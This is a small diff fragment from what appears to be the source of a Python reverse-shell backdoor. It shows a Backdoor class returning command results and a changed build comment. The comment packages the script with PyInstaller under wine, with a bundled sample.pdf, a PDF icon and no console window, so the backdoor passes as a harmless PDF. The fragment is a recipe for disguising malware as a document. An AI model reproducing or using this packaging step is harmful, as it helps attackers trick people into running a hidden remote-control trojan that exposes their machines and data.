@@ -87,7 +87,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-# pyinstaller.exe reverse_backdoor.py --add-data "sample.pdf;." --onefile --noconsole
+# wine pyinstaller.exe reverse_backdoor.py --add-data "sample.pdf;." --icon pdf.ico  --onefile --noconsole
 # "sample.pdf;." stands for default pyinstaller location
 # _MEIPASS is pyinstaller default location for packaged program
 # https://pyinstaller.readthedocs.io/en/stable/spec-files.html
